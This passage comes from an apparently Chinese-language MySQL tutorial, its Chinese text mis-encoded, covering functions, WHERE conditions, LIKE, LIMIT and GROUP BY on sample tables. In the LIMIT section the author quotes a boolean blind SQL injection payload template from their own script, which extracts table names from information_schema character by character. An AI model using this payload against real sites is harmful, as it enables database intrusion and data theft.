<p>min()</p>
</li>
</ol>
<p>è®¡ç®—æŒ‡å®šåˆ—çš„æœ€å°å€¼ï¼Œå¦‚æœæŒ‡å®šåˆ—æ˜¯å­—ç¬¦ä¸²ç±»å‹åˆ™ä½¿ç”¨å­—ç¬¦ä¸²æ’åºè¿ç®—</p>
<p>æŸ¥è¯¢è¯¥å­¦ç”Ÿè¡¨ä¸­å¹´çºªæœ€å°çš„å­¦ç”Ÿ MySQLå‘½ä»¤ï¼š</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> sname,<span class="built_in">min</span>(age) <span class="keyword">from</span> student;</span><br></pre></td></tr></table></figure>
<ol start="4">
<li class="lvl-3">
<p>sum()</p>
</li>
</ol>
<p>è®¡ç®—æŒ‡å®šåˆ—çš„æ•°å€¼å’Œï¼Œå¦‚æœæŒ‡å®šåˆ—ç±»å‹ä¸æ˜¯æ•°å€¼ç±»å‹åˆ™è®¡ç®—ç»“æœä¸º0</p>
<p>æŸ¥è¯¢è¯¥å­¦ç”Ÿè¡¨ä¸­å¹´çºªçš„æ€»å’Œ MySQLå‘½ä»¤ï¼š</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">sum</span>(age) <span class="keyword">from</span> student;</span><br></pre></td></tr></table></figure>
<ol start="5">
<li class="lvl-3">
<p>avg()</p>
</li>
</ol>
<p>è®¡ç®—æŒ‡å®šåˆ—çš„å¹³å‡å€¼ï¼Œå¦‚æœæŒ‡å®šåˆ—ç±»å‹ä¸æ˜¯æ•°å€¼ç±»å‹åˆ™è®¡ç®—ç»“æœä¸º</p>
<p>æŸ¥è¯¢è¯¥å­¦ç”Ÿè¡¨ä¸­å¹´çºªçš„å¹³å‡æ•° MySQLå‘½ä»¤ï¼š</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">avg</span>(age) <span class="keyword">from</span> student;</span><br></pre></td></tr></table></figure>
<h3 id="å…¶ä»–å‡½æ•°">å…¶ä»–å‡½æ•°</h3>
<ol>
<li class="lvl-3">
<p>æ—¶é—´å‡½æ•°</p>
</li>
</ol>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> NOW();</span><br><span class="line"><span class="keyword">SELECT</span> DAY (NOW());</span><br><span class="line"><span class="keyword">SELECT</span> <span class="type">DATE</span> (NOW());</span><br><span class="line"><span class="keyword">SELECT</span> <span class="type">TIME</span> (NOW());</span><br><span class="line"><span class="keyword">SELECT</span> YEAR (NOW());</span><br><span class="line"><span class="keyword">SELECT</span> MONTH (NOW());</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">CURRENT_DATE</span>();</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">CURRENT_TIME</span>();</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">CURRENT_TIMESTAMP</span>();</span><br><span class="line"><span class="keyword">SELECT</span> ADDTIME(<span class="string">&#x27;14:23:12&#x27;</span>,<span class="string">&#x27;01:02:01&#x27;</span>);</span><br><span class="line"><span class="keyword">SELECT</span> DATE_ADD(NOW(),<span class="type">INTERVAL</span> <span class="number">1</span> DAY);</span><br><span class="line"><span class="keyword">SELECT</span> DATE_ADD(NOW(),<span class="type">INTERVAL</span> <span class="number">1</span> MONTH);</span><br><span class="line"><span class="keyword">SELECT</span> DATE_SUB(NOW(),<span class="type">INTERVAL</span> <span class="number">1</span> DAY);</span><br><span class="line"><span class="keyword">SELECT</span> DATE_SUB(NOW(),<span class="type">INTERVAL</span> <span class="number">1</span> MONTH);</span><br><span class="line"><span class="keyword">SELECT</span> DATEDIFF(<span class="string">&#x27;2019-07-22&#x27;</span>,<span class="string">&#x27;2019-05-05&#x27;</span>);</span><br></pre></td></tr></table></figure>
<ol start="2">
<li class="lvl-3">
<p>å­—ç¬¦ä¸²å‡½æ•°</p>
</li>
</ol>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">--è¿æ¥å‡½æ•°</span><br><span class="line"><span class="section">SELECT CONCAT ()</span></span><br><span class="line"><span class="section">--</span></span><br><span class="line">SELECT INSTR ();</span><br><span class="line">--ç»Ÿè®¡é•¿åº¦</span><br><span class="line">SELECT LENGTH();</span><br></pre></td></tr></table></figure>
<ol start="3">
<li class="lvl-3">
<p>æ•°å­¦å‡½æ•°</p>
</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- ç»å¯¹å€¼</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">ABS</span>(<span class="number">-136</span>);</span><br><span class="line"><span class="comment">-- å‘ä¸‹å–æ•´</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">FLOOR</span>(<span class="number">3.14</span>);</span><br><span class="line"><span class="comment">-- å‘ä¸Šå–æ•´</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">CEILING</span>(<span class="number">3.14</span>);</span><br></pre></td></tr></table></figure>
<h2 id="æ¡ä»¶æŸ¥è¯¢">æ¡ä»¶æŸ¥è¯¢</h2>
<p>æ•°æ®åº“ä¸­å­˜æœ‰å¤§é‡æ•°æ®ï¼Œæˆ‘ä»¬å¯æ ¹æ®éœ€æ±‚è·å–æŒ‡å®šçš„æ•°æ®ã€‚æ­¤æ—¶ï¼Œæˆ‘ä»¬å¯åœ¨æŸ¥è¯¢è¯­å¥ä¸­é€šè¿‡WHEREå­å¥æŒ‡å®šæŸ¥è¯¢æ¡ä»¶å¯¹æŸ¥è¯¢ç»“æœè¿›è¡Œè¿‡æ»¤ã€‚åœ¨å¼€å§‹å­¦ä¹ æ¡ä»¶æŸ¥è¯¢ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆå‡†å¤‡æµ‹è¯•æ•°æ®ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- åˆ›å»ºæ•°æ®åº“</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">DATABASE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> mydb;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> mydb;</span><br><span class="line">USE mydb;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- åˆ›å»ºstudentè¡¨</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> student (</span><br><span class="line">    sid <span class="type">CHAR</span>(<span class="number">6</span>),</span><br><span class="line">    sname <span class="type">VARCHAR</span>(<span class="number">50</span>),</span><br><span class="line">    age <span class="type">INT</span>,</span><br><span class="line">    gender <span class="type">VARCHAR</span>(<span class="number">50</span>) <span class="keyword">DEFAULT</span> <span class="string">&#x27;male&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- å‘studentè¡¨æ’å…¥æ•°æ®</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1001&#x27;</span>, <span class="string">&#x27;lili&#x27;</span>, <span class="number">14</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1002&#x27;</span>, <span class="string">&#x27;wang&#x27;</span>, <span class="number">15</span>, <span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1003&#x27;</span>, <span class="string">&#x27;tywd&#x27;</span>, <span class="number">16</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1004&#x27;</span>, <span class="string">&#x27;hfgs&#x27;</span>, <span class="number">17</span>, <span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1005&#x27;</span>, <span class="string">&#x27;qwer&#x27;</span>, <span class="number">18</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1006&#x27;</span>, <span class="string">&#x27;zxsd&#x27;</span>, <span class="number">19</span>, <span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1007&#x27;</span>, <span class="string">&#x27;hjop&#x27;</span>, <span class="number">16</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1008&#x27;</span>, <span class="string">&#x27;tyop&#x27;</span>, <span class="number">15</span>, <span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1009&#x27;</span>, <span class="string">&#x27;nhmk&#x27;</span>, <span class="number">13</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1010&#x27;</span>, <span class="string">&#x27;xdfv&#x27;</span>, <span class="number">17</span>, <span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1012&#x27;</span>, <span class="string">&#x27;lili&#x27;</span>, <span class="number">14</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1013&#x27;</span>, <span class="string">&#x27;wang&#x27;</span>, <span class="number">15</span>, <span class="string">&#x27;female&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h3 id="å…³ç³»è¿ç®—ç¬¦">å…³ç³»è¿ç®—ç¬¦</h3>
<p>åœ¨WHEREä¸­å¯ä½¿ç”¨å…³ç³»è¿ç®—ç¬¦è¿›è¡Œæ¡ä»¶æŸ¥è¯¢ï¼Œå¸¸ç”¨çš„å…³ç³»è¿ç®—ç¬¦å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<table>
<thead>
<tr>
<th style="text-align:center">å…³ç³»è¿ç®—ç¬¦</th>
<th style="text-align:center">è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">=</td>
<td style="text-align:center">ç­‰äº</td>
</tr>
<tr>
<td style="text-align:center">&lt;&gt;</td>
<td style="text-align:center">ä¸ç­‰äº</td>
</tr>
<tr>
<td style="text-align:center">!=</td>
<td style="text-align:center">ä¸ç­‰äº</td>
</tr>
<tr>
<td style="text-align:center">&lt;</td>
<td style="text-align:center">å°äº</td>
</tr>
<tr>
<td style="text-align:center">&lt;=</td>
<td style="text-align:center">å°äºç­‰äº</td>
</tr>
<tr>
<td style="text-align:center">&gt;</td>
<td style="text-align:center">å¤§äº</td>
</tr>
<tr>
<td style="text-align:center">&gt;=</td>
<td style="text-align:center">å¤§äºç­‰äº</td>
</tr>
</tbody>
</table>
<h3 id="å¸¸ç”¨çš„å…³é”®å­—">å¸¸ç”¨çš„å…³é”®å­—</h3>
<ol>
<li class="lvl-3">
<p>ANDå…³é”®å­—</p>
</li>
</ol>
<p>æŸ¥è¯¢å¹´çºªå¤§äº15ä¸”æ€§åˆ«ä¸ºmaleçš„å­¦ç”Ÿä¿¡æ¯ MySQLå‘½ä»¤ï¼š</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> age&gt;<span class="number">15</span> and gender=<span class="string">&#x27;male&#x27;</span>;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li class="lvl-3">
<p>ORå…³é”®å­—</p>
</li>
</ol>
<p>æŸ¥è¯¢å¹´çºªå¤§äº15æˆ–è€…æ€§åˆ«ä¸ºmaleçš„å­¦ç”Ÿä¿¡æ¯</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> age&gt;<span class="number">15</span> or gender=<span class="string">&#x27;male&#x27;</span>;</span><br></pre></td></tr></table></figure>
<ol start="3">
<li class="lvl-3">
<p>INå…³é”®å­—</p>
</li>
</ol>
<p>INå…³é”®å­—ç”¨äºåˆ¤æ–­æŸä¸ªå­—æ®µçš„å€¼æ˜¯å¦åœ¨æŒ‡å®šé›†åˆä¸­ã€‚å¦‚æœå­—æ®µçš„å€¼æ°å¥½åœ¨æŒ‡å®šçš„é›†åˆä¸­ï¼Œåˆ™å°†å­—æ®µæ‰€åœ¨çš„è®°å½•å°†æŸ»è¯¢å‡ºæ¥ã€‚</p>
<p>æŸ¥è¯¢sidä¸ºS_1002å’ŒS_1003çš„å­¦ç”Ÿä¿¡æ¯</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="function"><span class="keyword">from</span> student <span class="keyword">where</span> sid <span class="title">in</span> (<span class="params"><span class="string">&#x27;S_1002&#x27;</span>,<span class="string">&#x27;S_1003&#x27;</span></span>)</span>;</span><br></pre></td></tr></table></figure>
<p>æŸ¥è¯¢sidä¸ºS_1001ä»¥å¤–çš„å­¦ç”Ÿçš„ä¿¡æ¯</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="function"><span class="keyword">from</span> student <span class="keyword">where</span> sid <span class="keyword">not</span> <span class="title">in</span> (<span class="params"><span class="string">&#x27;S_1001&#x27;</span></span>)</span>;</span><br></pre></td></tr></table></figure>
<ol start="4">
<li class="lvl-3">
<p>BETWEEN ANDå…³é”®å­—</p>
</li>
</ol>
<p>BETWEEN ANDç”¨äºåˆ¤æ–­æŸä¸ªå­—æ®µçš„å€¼æ˜¯å¦åœ¨æŒ‡å®šçš„èŒƒå›´ä¹‹å†…ã€‚å¦‚æœå­—æ®µçš„å€¼åœ¨æŒ‡å®šèŒƒå›´å†…ï¼Œåˆ™å°†æ‰€åœ¨çš„è®°å½•å°†æŸ¥è¯¢å‡ºæ¥ï¼ˆå¥½åƒä¸å¤ªä¸€å®šç­‰äºå³è¾¹çš„è¿˜æ˜¯å·¦è¾¹çš„ï¼‰</p>
<p>æŸ¥è¯¢15åˆ°18å²çš„å­¦ç”Ÿä¿¡æ¯</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> age <span class="keyword">between</span> <span class="number">15</span> <span class="keyword">and</span> <span class="number">18</span>;</span><br></pre></td></tr></table></figure>
<ol start="5">
<li class="lvl-3">
<p>NULLå…³é”®å­—</p>
</li>
</ol>
<p>åœ¨MySQLä¸­ï¼Œä½¿ç”¨ IS NULLå…³é”®å­—åˆ¤æ–­å­—æ®µçš„å€¼æ˜¯å¦ä¸ºç©ºå€¼ã€‚è¯·æ³¨æ„ï¼šç©ºå€¼NULLä¸åŒäº0ï¼Œä¹Ÿä¸åŒäºç©ºå­—ç¬¦ä¸²</p>
<p>æŸ¥è¯¢snameä¸ä¸ºç©ºå€¼çš„å­¦ç”Ÿä¿¡æ¯</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> sname <span class="keyword">is</span> not <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>
<h3 id="LIKEå…³é”®å­—">LIKEå…³é”®å­—</h3>
<p>åœ¨ MySQL ä¸­ï¼Œ LIKE è¿ç®—ç¬¦å¯ä»¥æ ¹æ®æŒ‡å®šçš„æ¨¡å¼è¿‡æ»¤æ•°æ®ã€‚LIKE è¿ç®—ç¬¦ä¸€èˆ¬ç”¨äºæ¨¡ç³ŠåŒ¹é…å­—ç¬¦æ•°æ®ã€‚<code>LIKE</code> è¿ç®—ç¬¦æ˜¯ä¸€ä¸ªåŒç›®æ¯”è¾ƒè¿ç®—ç¬¦ï¼Œéœ€è¦ä¸¤ä¸ªæ“ä½œæ•°ã€‚ <code>LIKE</code> è¿ç®—ç¬¦è¯­æ³•å¦‚ä¸‹ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">expression <span class="keyword">LIKE</span> <span class="keyword">pattern</span></span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>expression å¯ä»¥æ˜¯ä¸€ä¸ªå­—æ®µåã€å€¼æˆ–å…¶ä»–çš„è¡¨è¾¾å¼ï¼ˆæ¯”å¦‚å‡½æ•°è°ƒç”¨ã€è¿ç®—ç­‰ï¼‰ã€‚<br>
pattern æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²æ¨¡å¼ã€‚MySQL å­—ç¬¦ä¸²æ¨¡å¼æ”¯æŒä¸¤ä¸ªé€šé…ç¬¦ï¼š % å’Œ _ã€‚</p>
<ul class="lvl-2">
<li class="lvl-4">% åŒ¹é…é›¶æˆ–å¤šä¸ªä»»æ„å­—ç¬¦ã€‚</li>
<li class="lvl-5">_ åŒ¹é…å•ä¸ªä»»æ„å­—ç¬¦ã€‚</li>
<li class="lvl-5">å¦‚æœéœ€è¦åŒ¹é…é€šé…ç¬¦ï¼Œåˆ™éœ€è¦ä½¿ç”¨ \ è½¬ä¹‰å­—ç¬¦ï¼Œå¦‚ % å’Œ _ã€‚</li>
<li class="lvl-5">ä½¿ç”¨é€šé…ç¬¦åŒ¹é…æ–‡æœ¬æ—¶ï¼Œä¸åŒºåˆ†å­—æ¯å¤§å°å†™ã€‚</li>
</ul>
</li>
<li class="lvl-2">
<p>å¦‚æœ expression ä¸ pattern åŒ¹é…ï¼ŒLIKE è¿ç®—ç¬¦è¿”å› 1ï¼Œå¦åˆ™è¿”å› 0ã€‚</p>
</li>
</ul>
<p>å¸¸ç”¨ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>a%</code> åŒ¹é…ä»¥å­—ç¬¦ a å¼€å¤´çš„ä»»æ„é•¿åº¦çš„å­—ç¬¦ä¸²ã€‚</p>
</li>
<li class="lvl-2">
<p><code>%a</code> åŒ¹é…ä»¥å­—ç¬¦ a ç»“å°¾çš„ä»»æ„é•¿åº¦çš„å­—ç¬¦ä¸²ã€‚</p>
</li>
<li class="lvl-2">
<p><code>%a%</code> åŒ¹é…åŒ…å«å­—ç¬¦ a çš„ä»»æ„é•¿åº¦çš„å­—ç¬¦ä¸²ã€‚</p>
</li>
<li class="lvl-2">
<p><code>%a%b%</code> åŒ¹é…åŒæ—¶åŒ…å«å­—ç¬¦ a å’Œ b ä¸” a åœ¨ b å‰é¢çš„ä»»æ„é•¿åº¦çš„å­—ç¬¦ä¸²ã€‚</p>
</li>
<li class="lvl-2">
<p><code>a_</code> åŒ¹é…ä»¥å­—ç¬¦ a å¼€å¤´é•¿åº¦ä¸º 2 å­—ç¬¦ä¸²ã€‚</p>
</li>
<li class="lvl-2">
<p><code>_a</code> åŒ¹é…ä»¥å­—ç¬¦ a ç»“å°¾é•¿åº¦ä¸º 2 å­—ç¬¦ä¸²ã€‚</p>
</li>
<li class="lvl-2">
<p>ä½¿ç”¨<code>NOT LIKE</code>è¿›è¡Œå¦è®¤æŸ¥è¯¢</p>
</li>
</ul>
<ol>
<li class="lvl-4">
<p>æ™®é€šå­—ç¬¦ä¸²</p>
</li>
</ol>
<p>æŸ¥è¯¢snameä¸­ä¸wangåŒ¹é…çš„å­¦ç”Ÿä¿¡æ¯ MySQLå‘½ä»¤ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student <span class="keyword">where</span> sname <span class="keyword">like</span> <span class="string">&#x27;wang&#x27;</span>;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li class="lvl-3">
<p>å«æœ‰%é€šé…çš„å­—ç¬¦ä¸²</p>
</li>
</ol>
<p>%ç”¨äºåŒ¹é…ä»»æ„é•¿åº¦çš„å­—ç¬¦ä¸²ã€‚ä¾‹å¦‚ï¼Œå­—ç¬¦ä¸²â€œa%â€åŒ¹é…ä»¥å­—ç¬¦aå¼€å§‹ä»»æ„é•¿åº¦çš„å­—ç¬¦ä¸²</p>
<p>æŸ¥è¯¢å­¦ç”Ÿå§“åä»¥liå¼€å§‹çš„è®°å½• MySQLå‘½ä»¤ï¼š</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> sname <span class="keyword">like</span> <span class="string">&#x27;li%&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>æŸ¥è¯¢å­¦ç”Ÿå§“åä»¥gç»“å°¾çš„è®°å½• MySQLå‘½ä»¤ï¼š</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> sname <span class="keyword">like</span> <span class="string">&#x27;%g&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>æŸ¥è¯¢å­¦ç”Ÿå§“ååŒ…å«sçš„è®°å½• MySQLå‘½ä»¤ï¼š</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> sname <span class="keyword">like</span> <span class="string">&#x27;%s%&#x27;</span>;</span><br></pre></td></tr></table></figure>
<ol start="3">
<li class="lvl-3">
<p>å«æœ‰_é€šé…çš„å­—ç¬¦ä¸²</p>
</li>
</ol>
<p>ä¸‹åˆ’çº¿é€šé…ç¬¦åªåŒ¹é…å•ä¸ªå­—ç¬¦ï¼Œå¦‚æœè¦åŒ¹é…å¤šä¸ªå­—ç¬¦ï¼Œéœ€è¦è¿ç»­ä½¿ç”¨å¤šä¸ªä¸‹åˆ’çº¿é€šé…ç¬¦ã€‚ä¾‹å¦‚ï¼Œå­—ç¬¦ä¸²â€œab_â€åŒ¹é…ä»¥å­—ç¬¦ä¸²â€œabâ€å¼€å§‹é•¿åº¦ä¸º3çš„å­—ç¬¦ä¸²ï¼Œå¦‚abcã€abpç­‰ç­‰ï¼›å­—ç¬¦ä¸²â€œa__dâ€åŒ¹é…åœ¨å­—ç¬¦â€œaâ€å’Œâ€œdâ€ä¹‹é—´åŒ…å«ä¸¤ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸²ï¼Œå¦‚&quot;abcd&quot;ã€&quot;atud&quot;ç­‰ç­‰ã€‚</p>
<p>æŸ¥è¯¢å­¦ç”Ÿå§“åä»¥zxå¼€å¤´ä¸”é•¿åº¦ä¸º4çš„è®°å½• MySQLå‘½ä»¤ï¼š</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> sname <span class="keyword">like</span> <span class="string">&#x27;zx__&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>æŸ¥è¯¢å­¦ç”Ÿå§“åä»¥gç»“å°¾ä¸”é•¿åº¦ä¸º4çš„è®°å½• MySQLå‘½ä»¤ï¼š</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> sname <span class="keyword">like</span> <span class="string">&#x27;___g&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h3 id="ä½¿ç”¨LIMITé™åˆ¶æŸ¥è¯¢ç»“æœçš„æ•°é‡">ä½¿ç”¨LIMITé™åˆ¶æŸ¥è¯¢ç»“æœçš„æ•°é‡</h3>
<p>å½“æ‰§è¡ŒæŸ¥è¯¢æ•°æ®æ—¶å¯èƒ½ä¼šè¿”å›å¾ˆå¤šæ¡è®°å½•ï¼Œè€Œç”¨æˆ·éœ€è¦çš„æ•°æ®å¯èƒ½åªæ˜¯å…¶ä¸­çš„ä¸€æ¡æˆ–è€…å‡ æ¡ã€‚æ¯”å¦‚åœ¨è¿›è¡Œboolç›²æ³¨å…¥å¯¹æ•°æ®åº“çš„æ‰€æœ‰è¡¨åè¿›è¡Œçˆ†ç ´çš„æ—¶å€™ï¼Œéœ€è¦å•ç‹¬æå–æ¯ä¸€ä¸ªè¡¨ååˆ†åˆ«è¿›è¡Œçˆ†ç ´ã€‚è¯­å¥å¦‚ä¸‹ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table_name limit [<span class="keyword">offset</span>ï¼Œ] <span class="keyword">rows</span></span><br></pre></td></tr></table></figure>
<p>å‚æ•°è¯´æ˜ï¼š<br>
<strong>offsetï¼šæŒ‡å®šç¬¬ä¸€ä¸ªè¿”å›è®°å½•è¡Œçš„åç§»é‡ï¼ˆå³ä»å“ªä¸€è¡Œå¼€å§‹è¿”å›ï¼‰ï¼Œæ³¨æ„ï¼šåˆå§‹è¡Œçš„åç§»é‡ä¸º0ã€‚<br>
rowsï¼šè¿”å›å…·ä½“è¡Œæ•°ã€‚</strong></p>
<p><strong>æ€»ç»“ï¼šå¦‚æœlimitåé¢æ˜¯ä¸€ä¸ªå‚æ•°ï¼Œå°±æ˜¯æ£€ç´¢å‰å¤šå°‘è¡Œã€‚å¦‚æœlimitåé¢æ˜¯2ä¸ªå‚æ•°ï¼Œå°±æ˜¯ä»offset+1è¡Œå¼€å§‹ï¼Œæ£€ç´¢rowsè¡Œè®°å½•ã€‚</strong></p>
<p>ä¸¾ä¾‹ï¼š</p>
<p>æŸ¥è¯¢å­¦ç”Ÿè¡¨ä¸­å¹´çºªæœ€å°çš„3ä½åŒå­¦ MySQLå‘½ä»¤ï¼š</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">order</span> <span class="keyword">by</span> age <span class="keyword">asc</span> <span class="keyword">limit</span> <span class="number">3</span>;</span><br></pre></td></tr></table></figure>
<p>æˆ‘å†™çš„æŸä¸ªPythonè„šæœ¬ä¸­è¡¨åç›²æ³¨SQLçˆ†ç ´æ—¶çš„åˆ¤æ–­è¯­å¥</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;ascii(substr((select table_name from information_schema.tables limit &#123;index&#125;,1),&#123;i&#125;,1)) &gt; &#123;mid&#125;--+</span></span><br></pre></td></tr></table></figure>
<h3 id="ä½¿ç”¨GROUP-BYè¿›è¡Œåˆ†ç»„æŸ¥è¯¢">ä½¿ç”¨GROUP BYè¿›è¡Œåˆ†ç»„æŸ¥è¯¢</h3>
<p>GROUP BY å­å¥å¯åƒåˆ‡è›‹ç³•ä¸€æ ·å°†è¡¨ä¸­çš„æ•°æ®è¿›è¡Œåˆ†ç»„ï¼Œå†è¿›è¡ŒæŸ¥è¯¢ç­‰æ“ä½œã€‚æ¢è¨€ä¹‹ï¼Œå¯é€šä¿—åœ°ç†è§£ä¸ºï¼šé€šè¿‡GROUP BYå°†åŸæ¥çš„è¡¨æ‹†åˆ†æˆäº†å‡ å¼ å°è¡¨ã€‚</p>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬é€šè¿‡ä¸€ä¸ªä¾‹å­å¼€å§‹å­¦ä¹ GROUP BYï¼Œä»£ç å¦‚ä¸‹</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- åˆ›å»ºæ•°æ®åº“</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">DATABASE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> mydb;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> mydb;</span><br><span class="line">USE mydb;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- åˆ›å»ºå‘˜å·¥è¡¨</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> employee (</span><br><span class="line">    id <span class="type">int</span>,</span><br><span class="line">    <span class="type">name</span> <span class="type">varchar</span>(<span class="number">50</span>),</span><br><span class="line">    salary <span class="type">int</span>,</span><br><span class="line">    departmentnumber <span class="type">int</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- å‘å‘˜å·¥è¡¨ä¸­æ’å…¥æ•°æ®</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">&#x27;tome&#x27;</span>,<span class="number">2000</span>,<span class="number">1001</span>); </span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">values</span>(<span class="number">2</span>,<span class="string">&#x27;lucy&#x27;</span>,<span class="number">9000</span>,<span class="number">1002</span>); </span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">values</span>(<span class="number">3</span>,<span class="string">&#x27;joke&#x27;</span>,<span class="number">5000</span>,<span class="number">1003</span>); </span><br><span class="line"><span class="keyword">INSERT</span> 